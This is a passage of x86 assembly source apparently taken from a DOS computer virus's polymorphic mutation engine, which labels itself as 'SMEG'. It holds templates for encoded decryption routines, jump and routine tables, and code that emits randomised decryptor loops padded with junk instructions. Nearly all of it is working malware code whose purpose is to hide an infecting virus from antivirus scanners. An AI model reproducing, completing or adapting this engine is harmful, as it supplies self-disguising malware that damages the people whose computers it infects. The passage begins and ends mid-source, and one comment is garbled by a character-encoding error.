        ; PUSH [reg7+offset]            (08)
        ; POP reg0                      (0B)
        ; XCHG reg2,reg0                (0C)
        ; POP reg0                      (0B)
        ; PUSH reg0                     (0A)
        ; SUB reg2,reg0                 (07)
        ; MOV [reg7+offset],reg2        (6)
        ; INC reg7                      (C)
        ; MOV reg2,reg1                 (8)
        ; MOV reg2,reg1                 (8)
        ; INC reg2                      (0D)
        ; INC reg2                      (0D)
        ; XCHG reg2,reg0                (0C)
        ; MOV reg1,reg0                 (0E)
        ; POP reg0                      (0B)
        ; INC reg0                      (02)
        ; AND reg1,reg1                 (0F)
        ; done                          (-1)
        db       13h,42h,0EFh,0Dh,70h,0A0h,80h,0B0h,0C0h,0B0h,0A0h
        db       76h,0C8h,80h,0D0h,0D0h,0C0h,0E0h,0B0h,20h,0F0h,-1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routineF:
        db       56h
        ; MOV reg7,initial pointer      (3)
        ; MOV reg1,initial counter      (4)
        ; MOV reg0,CS                   (1)
        ; MOV DS,reg0                   (2)
        ; MOV DS,reg0                   (2)
        ; MOV reg0,encryption value     (E)
        ; beginning of loop             (0)
        ; MOV reg2,[reg7+offset]        (5)
        ; INC reg2                      (0D)
        ; ADD reg2,reg0                 (06)
        ; MOV [reg7+offset],reg2        (6)
        ; MOV reg2,reg1                 (8)
        ; DEC reg0                      (03)
        ; XOR reg2,reg0                 (F)
        ; DEC reg1                      (D)
        ; INC reg7                      (C)
        ; DEC reg1                      (D)
        ; done                          (-1)
        db       34h,12h,2Eh,5h,0D0h,66h,80h,3Fh,0DCh,0D0h,-1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routine9:
        db       27h
        ; MOV reg1,initial counter      (4)
        ; MOV reg0,CS                   (1)
        ; MOV reg7,initial pointer      (3)
        ; MOV DS,reg0                   (2)
        ; MOV reg0,encryption value     (E)
        ; XOR reg2,reg0                 (F)
        ; beginning of loop             (0)
        ; XOR [reg7],reg0               (9)
        ; XOR reg2,reg0                 (F)
        ; ADD reg7,1                    (04)
        ; PUSH reg0                     (0A)
        ; MOV reg2,reg1                 (8)
        ; DEC reg1                      (D)
        ; INC reg2                      (0D)
        ; INC reg2                      (0D)
        ; INC reg2                      (0D)
        ; XCHG reg2,reg0                (0C)
        ; MOV reg1,reg0                 (0E)
        ; POP reg0                      (0B)
        ; DEC reg0                      (03)
        ; AND reg1,reg1                 (0F)
        ; done                          (-1)
        db       41h,32h,0EFh,9h,0F0h,40h,0A8h,0D0h,0D0h,0D0h
        db       0C0h,0E0h,0B0h,30h,0F0h,-1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routine7:
        db       32h
        ; MOV reg1,initial counter      (4)
        ; MOV reg0,CS                   (1)
        ; MOV reg7,initial pointer      (3)
        ; MOV DS,reg0                   (2)
        ; MOV reg0,encryption value     (E)
        ; XCHG reg2,reg0                (0C)
        ; beginning of loop             (0)
        ; MOV reg2,reg1                 (8)
        ; DEC reg1                      (D)
        ; POP reg0                      (0B)
        ; XOR reg2,reg0                 (F)
        ; MOV [reg7+offset],reg2        (6)
        ; DEC reg0                      (03)
        ; XCHG reg2,reg0                (0C)
        ; ADD reg7,1                    (04)
        ; DEC reg1                      (D)
        ; done                          (-1)
        ; return code 0                 (0)
        db       41h,32h,0E0h,0C0h,8h,0D0h,0BFh,60h,30h,0C0h,4Dh,-1,0
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routine5:
        db       11h
        ; MOV reg1,initial counter      (4)
        ; MOV reg7,initial pointer      (3)
        ; MOV reg0,CS                   (1)
        ; MOV DS,reg0                   (2)
        ; MOV reg0,encryption value     (E)
        ; XOR reg2,reg0                 (F)
        ; beginning of loop             (0)
        ; NEG [reg7+offset]             (A)
        ; MOV reg2,[reg7+offset]        (5)
        ; XOR reg2,reg0                 (F)
        ; DEC reg1                      (D)
        ; DEC reg0                      (03)
        ; DEC reg0                      (03)
        ; XCHG reg2,reg0                (0C)
        ; XCHG reg0,[reg7+offset]       (01)
        ; XCHG reg2,reg0                (0C)
        ; ADD reg7,1                    (04)
        ; AND reg1,reg1                 (0F)
        ; done                          (-1)
        db       43h,12h,0EFh,0Ah,5Fh,0D0h,30h,30h,0C0h,10h,0C0h,40h,0F0h,-1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routineB:
        db       66h
        ; MOV reg7,initial pointer      (3)
        ; MOV reg0,CS                   (1)
        ; MOV reg1,initial counter      (4)
        ; MOV DS,reg0                   (2)
        ; MOV reg0,encryption value     (E)
        ; XOR reg2,reg0                 (F)
        ; beginning of loop             (0)
        ; PUSH reg0                     (0A)
        ; PUSH [reg7+offset]            (08)
        ; MOV reg2,reg1                 (8)
        ; MOV reg2,reg1                 (8)
        ; XCHG reg2,reg0                (0C)
        ; INC reg0                      (02)
        ; INC reg0                      (02)
        ; INC reg0                      (02)
        ; INC reg0                      (02)
        ; MOV reg1,reg0                 (0E)
        ; POP reg0                      (0B)
        ; XCHG reg2,reg0                (0C)
        ; POP reg0                      (0B)
        ; ADD reg2,reg0                 (06)
        ; PUSH reg0                     (0A)
        ; XCHG reg2,reg0                (0C)
        ; PUSH reg0                     (0A)
        ; POP [reg7+offset]             (09)
        ; POP reg0                      (0B)
        ; DEC reg0                      (03)
        ; INC reg7                      (C)
        ; XOR reg2,reg0                 (F)
        ; AND reg1,reg1                 (0F)
        ; done                          (-1)
        db       31h,42h,0EFh,0,0A0h,88h,80h,0C0h,20h,20h,20h,20h,0E0h
        db       0B0h,0C0h,0B0h,60h,0A0h,0C0h,0A0h,90h,0B0h,3Ch,0F0h,0F0h,-1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routine3:
        db       4h
        ; MOV reg0,CS                   (1)
        ; MOV DS,reg0                   (2)
        ; MOV reg0,encryption value     (E)
        ; MOV reg2,reg1                 (8)
        ; MOV reg1,initial counter      (4)
        ; MOV reg7,initial pointer      (3)
        ; beginning of loop             (0)
        ; MOV reg2,reg1                 (8)
        ; DEC reg1                      (D)
        ; INC reg2                      (0D)
        ; XCHG reg2,reg0                (0C)
        ; MOV reg1,reg0                 (0E)
        ; XCHG reg2,reg0                (0C)
        ; XOR [reg7],reg0               (9)
        ; INC reg7                      (C)
        ; INC reg0                      (02)
        ; INC reg0                      (02)
        ; AND reg1,reg1                 (0F)
        ; done                          (-1)
        db       12h,0E8h,43h,8,0D0h,0D0h,0C0h,0E0h,0C9h,0C0h,20h,20h
        db       0F0h,-1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routineD:
        db       73h
        ; MOV reg7,initial pointer      (3)
        ; MOV reg0,CS                   (1)
        ; MOV reg1,initial counter      (4)
        ; MOV DS,reg0                   (2)
        ; MOV reg0,encryption value     (E)
        ; MOV reg1,initial counter      (4)
        ; beginning of loop             (0)
        ; DEC reg1                      (D)
        ; DEC reg1                      (D)
        ; DEC reg1                      (D)
        ; NOT [reg7+offset]             (B)
        ; PUSH reg0                     (0A)
        ; PUSH [reg7+offset]            (08)
        ; POP reg0                      (0B)
        ; XCHG reg2,reg0                (0C)
        ; POP reg0                      (0B)
        ; XOR reg2,reg0                 (F)
        ; MOV [reg7+offset],reg2        (6)
        ; INC reg0                      (02)
        ; ADD reg7,1                    (04)
        ; INC reg0                      (02)
        ; SUB reg1,1                    (05)
        ; done                          (-1)
        db       31h,42h,0E4h,0Dh,0DDh,0B0h,0A0h,80h,0B0h,0C0h,0BFh,60h
        db       20h,40h,20h,50h,-1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routine0:
        db       20h
        ; MOV reg0,encryption value     (E)
        ; XCHG reg2,reg0                (0C)
        ; MOV reg0,CS                   (1)
        ; MOV reg7,initial pointer      (3)
        ; MOV DS,reg0                   (2)
        ; MOV reg1,initial counter      (4)
        ; beginning of loop             (0)
        ; XCHG reg0,[reg7+offset]       (01)
        ; XCHG reg2,reg0                (0C)
        ; XOR reg2,reg0                 (F)
        ; DEC reg1                      (D)
        ; XCHG reg2,reg0                (0C)
        ; XCHG reg0,[reg7+offset]       (01)
        ; XCHG reg2,reg0                (0C)
        ; MOV reg2,reg1                 (8)
        ; INC reg7                      (C)
        ; INC reg2                      (0D)
        ; INC reg2                      (0D)
        ; INC reg2                      (0D)
        ; INC reg0                      (02)
        ; XCHG reg2,reg0                (0C)
        ; MOV reg1,reg0                 (0E)
        ; AND reg1,reg1                 (0F)
        ; done                          (-1)
        ; return code 0                 (0)
        db       0E0h,0C1h,32h,40h,0,10h,0CFh,0D0h,0C0h,10h,0C8h,0C0h,0D0h
        db       0D0h,0D0h,20h,0C0h,0E0h,0F0h,-1,0
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routine6:
        db       55h
        ; MOV reg1,initial counter      (4)
        ; MOV reg7,initial pointer      (3)
        ; MOV reg0,CS                   (1)
        ; MOV DS,reg0                   (2)
        ; MOV reg0,encryption value     (E)
        ; MOV reg7,initial pointer      (3)
        ; beginning of loop             (0)
        ; MOV reg2,[reg7+offset]        (5)
        ; DEC reg1                      (D)
        ; SUB reg2,reg0                 (07)
        ; INC reg0                      (02)
        ; SUB reg1,1                    (05)
        ; MOV [reg7+offset],reg2        (6)
        ; INC reg7                      (C)
        ; DEC reg1                      (D)
        ; done                          (-1)
        db       43h,12h,0E3h,5h,0D0h,70h,20h,56h,0CDh,-1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routineA:
        db       47h
        ; MOV reg0,encryption value     (E)
        ; MOV reg7,initial pointer      (3)
        ; MOV reg1,initial counter      (4)
        ; XCHG reg2,reg0                (0C)
        ; MOV reg0,CS                   (1)
        ; MOV DS,reg0                   (2)
        ; beginning of loop             (0)
        ; PUSH [reg7+offset]            (08)
        ; POP reg0                      (0B)
        ; XCHG reg2,reg0                (0C)
        ; XOR reg2,reg0                 (F)
        ; MOV [reg7+offset],reg2        (6)
        ; MOV reg2,reg1                 (8)
        ; DEC reg1                      (D)
        ; DEC reg0                      (03)
        ; INC reg2                      (0D)
        ; INC reg2                      (0D)
        ; INC reg2                      (0D)
        ; XCHG reg2,reg0                (0C)
        ; MOV reg1,reg0                 (0E)
        ; ADD reg7,1                    (04)
        ; AND reg1,reg1                 (0F)
        ; done                          (-1)
        ; return code 0                 (0)
        db       0E3h,40h,0C1h,20h,0h,80h,0B0h,0CFh,68h,0D0h,30h,0D0h,0D0h
        db       0D0h,0C0h,0E0h,40h,0F0h,-1,0
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
jmp_table:
        dw       offset(jmp0-virus)
        dw       offset(jmp1-virus)
        dw       offset(jmp2-virus)
        dw       offset(jmp3-virus)
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
routine_table:
        dw       offset(routine0-virus)
        dw       offset(routine1-virus)
        dw       offset(routine2-virus)
        dw       offset(routine3-virus)
        dw       offset(routine4-virus)
        dw       offset(routine5-virus)
        dw       offset(routine6-virus)
        dw       offset(routine7-virus)
        dw       offset(routine8-virus)
        dw       offset(routine9-virus)
        dw       offset(routineA-virus)
        dw       offset(routineB-virus)
        dw       offset(routineC-virus)
        dw       offset(routineD-virus)
        dw       offset(routineE-virus)
        dw       offset(routineF-virus)
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
counterinit0:
        neg      ax
counterinit1:
        retn
counterinit2:
        neg      ax
counterinit3:
        add      ax,ax
        retn
counterinit4:
        neg      ax
counterinit5:
        mov      cx,ax
        add      ax,ax
        add      ax,cx
        retn
counterinit6:
        neg      ax
counterinit7:
        add      ax,ax
        add      ax,ax
        retn
jmp0:
        mov      al,0E9h                 ; encode a JMP
        stosb                            ; (with word offset)
        mov      ax,di                   ; calculate offset to
        sub      ax,ds:[loop_top-virus]        ; top of decryption loop
        inc      ax                      ; adjust for jmp instruction
        inc      ax
        neg      ax                      ; adjust for going back instead
        retn                             ; of forwards
jmp1:
        mov      ax,0E0FFh               ; encode JMP register
        or       ah,[si]
        retn
jmp2:
        mov      ax,0C350h                ; encode PUSH/RETn
jmpXdone:
        or       al,[si]
        retn
jmp3:
        mov      al,0Eh                   ; encode PUSH CS
        stosb
        call     garble_some              ; garble a bit
        mov      ax,0CB50h                ; encode PUSH reg/RETN
        jmp      short jmpXdone
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
encode_routine:
        call     random_any_ax           ; pick a random routine
        mov      bx,offset(routine_table-virus) ; to use
        and      ax,0Fh
        add      ax,ax
        add      bx,ax
        mov      bx,[bx]
        mov      si,bx
        lodsb                            ; get the first byte
        mov      ds:[crypt_type-virus],al      ; and save it
        jmp      short encode_routine2   ; keep going...
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
encode_it:
        lodsb                            ; get the next byte
        cmp      ah,-1                   ; are we done?
        je       use_as_is               ; if so, exit
        xor      bh,bh                   ; convert AL to
        add      al,al                   ; offset in encode_table
        mov      bl,al
        add      bx,offset(encode_table-virus)
        mov      al,dh
        mov      cx,3
        mov      bx,[bx]
        call     bx
        xchg     ah,al
        stosb                           ; write the resulting byte
use_as_is:
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
fill_mod_field:
        ror      al,cl
fill_field:
        and      al,7h                   ; get the register # al
        mov      bx,offset(dataarea_for_SMEG-virus+6)
        xlat
        rol      al,cl
        and      cl,cl                   ; encoding rm or reg?
        jnz      not_memory              ; branch if doing rm
        test     dh,40h                  ; memory access?
        jz       not_memory
        cmp      al,3h                   ; using bx?
        jne      not_BX
        mov      al,7h                   ; change it to di
        jmp      short not_memory
not_BX:
        cmp      al,6h                   ; is it si?
        jb       not_memory
        sub      al,2h                   ; change it to double register
not_memory:
        or       ah,al
        retn
fill_reg_reg1:
        ror      al,cl                   ; [reg], reg
fill_reg_field:
        xor      cl,cl                   ; fill bottom 3 bits only
        jmp      short fill_field
fill_mod_n_reg:
        call     fill_mod_field          ; fill mod field as usual
        mov      al,dh                   ; fill reg field with the
        jmp      short fill_reg_field    ; register that holds the
fill_reg_reg2:
        call     fill_field
        mov      al,dh
        jmp      short fill_reg_reg1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
encode_routine2:
        mov      word ptr ds:[which_tbl-virus],offset(encode_tbl1-6h-virus)
process_all:
        lodsb                            ; get a byte
        cmp      al,-1                   ; are we at the end?
        jne      process_byte            ; no, keep going
        lodsb                            ; else get returncode and exit
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
process_byte:
        push     si ax
        mov      cl,4
        call     process_nibble
        xor      cl,cl
        pop      ax
        call     process_nibble
        pop      si
        jmp      short process_all
process_nibble:
        ror      al,cl                   ; only use the part of
        and      ax,0Fh                  ; the byte that we want
        jnz      no_switch_table
        and      cl,cl                   ; if the lower half of byte=0,
        jz       switch_tables           ; switch tables
        mov      ds:[loop_top-virus],di        ; otherwise save this location
        retn                             ; as the top of the loop
switch_tables:
        mov      word ptr ds:[which_tbl-virus],offset(encode_tbl2-6-virus)
        retn
no_switch_table:
        push     ax
        call     garble_more
        pop      ax
        add      ax,ax                   ; calculate AX*6+ds:[which_tbl--virus]
        mov      bx,ax
        add      ax,ax
        add      ax,bx
        add      ax,ds:[which_tbl-virus]
        mov      word ptr ds:[which_tbl-virus],offset(encode_tbl1-6h-virus)
        xchg     si,ax
        lodsb
        mov      dh,al                   ; dh holds first byte
        lodsb
        xchg     ah,al                   ; ah holds second byte
        call     encode_it               ; process it
        lodsb                            ; now ah holds the next byte
        xchg     ah,al
        call     encode_it               ; process it
        lodsb                            ; get the next byte
        mov      dl,al                   ; it tells us which
        and      ax,0Fh                  ; value to write in
        add      ax,ax                   ; this is the modifier
        add      ax,offset(write_table-virus)
        xchg     bx,ax                   ; value, etc.
        mov      bx,[bx]
        jmp      bx
write_nothing:
        retn
write_cryptval:
        mov      al,ds:[cryptval-virus]
        stosb
        retn
write_pointer_patch:    ; save location of pointer initialisation
        mov      ds:[pointer_patch-virus],di
        stosw
        retn
write_counter_patch:    ; save location of counter initialisation
        mov      ds:[counter_patch-virus],di
        stosw
        retn
write_ptr_offset:       ; write XXXX of [bx+XXXX]
        mov      ax,ds:[ptr_offsets-virus]
        mov      ds:[pointer_fixup-virus],ax
        stosw
        retn
write_dl:
        mov      al,dl                   ; write lower half of top
        mov      cl,4                    ; byte of dl as a word
        shr      al,cl                   ; used as amount to increment
        and      ax,0Fh
        stosw
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
garble_some:
        push     si
        mov      dx,3                    ; garble 2-5 times
        call     multiple_garble
        pop      si
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
garble_more:
        mov      dx,7h
multiple_garble:
        call     random_dx
        inc      dx
        inc      dx
        xchg     cx,dx
garble_again:
        push     cx                      ; save garble count
        call     garble_once             ; garble
        pop      cx                      ; restore garble count
        loop     garble_again
        cmp      ds:[cJMP_patch-virus],cx      ; cJMP_patch == 0? i.e. is
        je       skip_finish_cJMP        ; there an unfinished cJMP?
        call     finish_cJMP             ; if so, finish it
skip_finish_cJMP:
        call     many_nonbranch_garble   ; garble garble
        mov      bx,ds:[nJMP_patch-virus]      ; check if pending nJMP
        and      bx,bx
        jnz      loc_0047                ; if so, keep going
        retn
loc_0047:                                ;  xref 4028:0996
        mov      al,0C3h                 ; encode a RETN
        stosb
        mov      ax,di
        sub      ax,bx
        dec      ax
        dec      ax
        mov      [bx],ax
        mov      ds:[CALL_patch-virus],bx
        mov      word ptr ds:[nJMP_patch-virus],0
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
many_nonbranch_garble:
        call     random_any_ax                 ; do large instruction
        and      ax,3                    ; garble from 3 to 6 times
        add      al,3
        xchg     cx,ax
many_nonbranch_garble_loop:
        push     cx
        call     not_branch_garble
        pop      cx
        loop     many_nonbranch_garble_loop
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; finish_cJMP simply encodes a few instructions between the conditional
; jmp and its target, and then sets the destination of the jmp to be after
; the inserted instructions.
finish_cJMP:
        mov      ax,di                   ; get current location
        mov      bx,ds:[cJMP_patch-virus]      ; get previous location
        sub      ax,bx
        dec      al                      ; calculate offset
        jnz      go_patch_cJMP           ; if nothing in between,
        call     not_branch_garble       ; fill in some instructions
        jmp      short finish_cJMP       ; and do this again
go_patch_cJMP:
        cmp      ax,7Fh                  ; are we close enough?
        jbe      patch_cJMP              ; if so, finish this now
        xor      al,al                   ; if not, encode cJMP $+2
patch_cJMP:
        mov      [bx],al                 ; patch the cJMP destination
        mov      word ptr ds:[cJMP_patch-virus],0 ; clear usage flag
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
set_reg_mask:
        and      cl,0F8h                  ; clear bottom 3 bits
        mov      bx,offset(dataarea_for_SMEG-virus+6)
        mov      dh,7h                    ; assume one of 8 registers
        test     dl,4h                    ; can we use any register?
        jnz      set_reg_mask_exit       ; if so, quit
        add      bx,3     ; otherwise, set mask so we
        mov      dh,3                    ; only choose from regs 3-6
set_reg_mask_exit:
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
choose_register:
        call     random_any_ax           ; get random number
        xor      ah,ah                   ; clear high byte
        and      al,dh                   ; use mask from set_reg_mask
        add      bx,ax
        mov      al,[bx]                 ; get the register number
        test     ch,1                    ; byte or word register?
        jnz      choose_reg_done         ; if word, we are okay
        test     byte ptr [si-2],4       ; otherwise, check if we can
        jnz      choose_reg_done         ; take only half the register
        mov      ah,al                   ; uh oh, we can't, so...
        and      al,3                    ; is it one of the garbage
        cmp      al,ds:[dataarea_for_SMEG-virus+9h]
        mov      al,ah                   ; if so, we are done
        jz       choose_reg_done
        mov      al,ds:[dataarea_for_SMEG-virus+9h]
        cmp      al,4                    ; ax,cx,dx, or bx?
        jb       werd                    ; to yer muthah!
        pop      ax                      ; pop off return location
        retn                             ; go to caller's caller
werd:
        and      ah,4                    ; make either byte or word
        or       al,ah                   ; register
choose_reg_done:
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
garble_once:
        call     random_any_ax
        cmp      ah,0C8h                 ; randomly go to either
        jbe      other_garble            ; here ...
        jmp      branch_garble           ; ... or here
not_branch_garble:
        call     random_any_ax
other_garble:
        cmp      al,0F0h
        jbe      larger_instr            ; mostly do larger instructions
        jmp      do_one_byte             ; 1/16 chance
        ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
        ;‡ ¬ãá®p¨¬ ¡®«ìè®© ¨­áâpãªæ¨¥©
larger_instr:
        and      ax,1Fh                  ; normalise random number
        add      ax,ax
        add      ax,offset(garble_table-virus)
        xchg     si,ax
        lodsw    ;AX=DS:[SI]             ; get table entry
        xchg     cx,ax                   ; keep it in CX
        mov      dl,cl                   ; pick out the bottom
        and      dl,3                    ; mask out low 2 bits
        xor      dh,dh
        call     random_dx
        or       ch,dl                   ; byte for variable opcodes
                                         ; (e.g. allows byte & word
                                         ;  forms of opcode to use the
                                         ;  same table entry)
        mov      dl,cl
        and      dl,0C0h                 ; mask out mod field
        cmp      dl,0C0h                 ; does it indicate register
        mov      dl,cl                   ; operation? i.e. 2 regs
        jz       no_memory               ; if so, branch
        call     set_reg_mask            ; otherwise, process memory
        call     random_any_ax           ; and register operation
        and      al,0C0h                 ; clear all but top 2 bits
        or       cl,al                   ; fill in the field
        rol      al,1
        rol      al,1
        mov      dl,al
        call     random_any_ax           ; generate the registers to use
        and      al,7h                   ; in memory access,i.e. [bx+si]
        or       cl,al                   ; patch into 2nd byte of instr
        cmp      dl,3h
        je       fill_in_rm
        cmp      al,6h
        jne      force_byte
        mov      dl,2h                   ; alter mask to choose AX or DX
        and      cl,3Fh
        jmp      short fill_in_rm
force_byte:
        and      ch,not 1                ; change to byte data
                                         ; "byte sized"
fill_in_rm:
        call     choose_register         ; move register into
        shl      al,1                    ; the rm field
        shl      al,1
        shl      al,1
finish_larger:
        or       cl,al                   ; combine data
        xchg     cx,ax                   ; move it to the right register
        xchg     ah,al                   ; reverse byte order
        stosw                            ; write the instruction
        and      dl,dl                   ; needs data bytes?
        jnz      needs_data
        retn
needs_data:
        cmp      dl,3h                   ; check length of instruction
        jne      do_data_bytes
        retn
do_data_bytes:
        call     random_any_ax           ; keep the random number
        and      al,3Fh                  ; under 40h
        stosb                            ; write the byte
        dec      dl                      ; decrement bytes to write
        jnz      do_data_bytes
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
no_memory:
        call     set_reg_mask
        call     choose_register
        mov      ah,ch                   ; get the opcode and clear the
        and      ah,0FEh                 ; size bit for now
        cmp      ah,0F6h
        jne      not_NOT_NEG
        test     cl,10h                  ; is it TEST instruction?
        jz       not_NOT_NEG             ; if it is, go find the number
                                         ; of data bytes it needs, else
                                         ; it is NOT or NEG, so there're
no_data_bytes:
        xor      dl,dl                   ; no data bytes
        jmp      short finish_larger
not_NOT_NEG:
        and      ah,0FCh                  ; is it a shift or rotate?
        cmp      ah,0D0h
        jne      set_data_length         ; if not, calculate # data
                                         ; bytes needed, else
        jmp      short no_data_bytes     ; we don't need any
set_data_length:
        test     ch,1                    ; byte or word of data?
        mov      dl,2                    ; assume word
        jnz      finish_larger           ; continue if so
        dec      dl                      ; DEC DX is better!!!
        jmp      short finish_larger     ; otherwise adjust to data
